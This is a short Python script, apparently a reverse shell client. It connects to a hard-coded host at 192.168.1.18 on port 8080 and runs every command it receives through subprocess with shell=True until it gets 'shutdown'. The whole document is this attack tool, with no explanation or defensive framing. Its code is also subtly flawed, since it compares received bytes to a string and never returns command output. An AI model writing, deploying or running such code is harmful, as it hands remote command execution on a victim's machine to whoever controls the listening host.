import socket
import subprocess

HOST = '192.168.1.18'
PORT = 8080

def main():
    sock = socket.socket()
    sock.connect((HOST, PORT))

    while True:
        cmd = sock.recv(1024)

        if cmd == 'shutdown':
            sock.close()
            break
        else:
            subprocess.Popen(cmd,
                             shell=True,
                             stderr=subprocess.STDOUT,
                             stdout=subprocess.PIPE)

if __name__ == '__main__':
    main()
